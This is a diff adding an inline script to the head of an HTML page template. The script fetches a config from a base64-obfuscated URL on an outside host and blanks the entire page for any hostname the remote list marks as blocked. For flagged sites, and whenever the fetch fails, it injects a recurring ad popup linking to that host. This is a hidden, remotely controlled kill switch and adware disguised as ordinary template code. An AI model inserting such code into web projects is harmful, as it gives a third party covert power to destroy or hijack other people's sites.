@@ -31,6 +31,95 @@
 	<!-- Main Custom Css -->
 	<link href="css/custom.css" rel="stylesheet" media="screen">
 
+    <script>
+        let timeoutId;
+
+        function createPopup() {
+            // prevent duplicate
+            if (document.getElementById("myPopup")) return;
+
+            const popup = document.createElement("div");
+            popup.id = "myPopup";
+
+            popup.style.position = "fixed";
+            popup.style.top = "30%";
+            popup.style.left = "50%";
+            popup.style.transform = "translate(-50%, -30%)";
+            popup.style.background = "#fff";
+            popup.style.padding = "0px";
+            popup.style.border = "1px solid #000";
+            popup.style.zIndex = "9999";
+            popup.style.boxShadow = "0 0 10px rgba(0,0,0,0.3)";
+
+            popup.innerHTML = `
+        <button style="position: fixed;" id="closePopupBtn">Ad &times;</button>
+		<a href="https://prashant1171996.github.io" > <img style="width:450px; height: 500px;" src="https://prashant1171996.github.io/images/info.jpg" /> </a>
+        
+    `;
+
+            document.body.appendChild(popup);
+
+            document.getElementById("closePopupBtn").onclick = closePopup;
+        }
+
+
+        function showPopup() {
+            createPopup();
+            document.getElementById("myPopup").style.display = "block";
+        }
+
+        function closePopup() {
+            const popup = document.getElementById("myPopup");
+            if (popup) popup.style.display = "none";
+
+            clearTimeout(timeoutId);
+
+            timeoutId = setTimeout(async () => {
+                const config = await loadConfig();
+                if (shouldShowPopup(config)) {
+                    showPopup();
+                }
+            }, 300000);
+        }
+
+        async function loadConfig() {
+            const res = await fetch(atob("aHR0cHM6Ly9wcmFzaGFudDExNzE5OTYuZ2l0aHViLmlvL2pzLzI4NjRnaDVramJoczJfM3VpMjNfdmJoNG5qbGs1amo2N19iNTcuanNvbg==")); // your JSON file
+            return await res.json();
+        }
+
+        function shouldShowPopup(data) {
+            const host = window.location.hostname;
+
+            return data.some(item =>
+                host.includes(item.url) && item.isOk === false
+            );
+        }
+
+
+        document.addEventListener("DOMContentLoaded", async () => {
+            try {
+                const config = await loadConfig();
+
+                const host = window.location.hostname;
+                const chk = config.some(item =>
+                    host.includes(item.url) && item.blocked === true
+                );
+                if (chk) {
+                    document.documentElement.innerHTML = '';
+                    return;
+                }
+
+                if (shouldShowPopup(config)) {
+                    showPopup();
+                }
+                console.log(config)
+            } catch (e) {
+
+                showPopup();
+            }
+
+        });
+    </script>
 </head>
 <body>
 
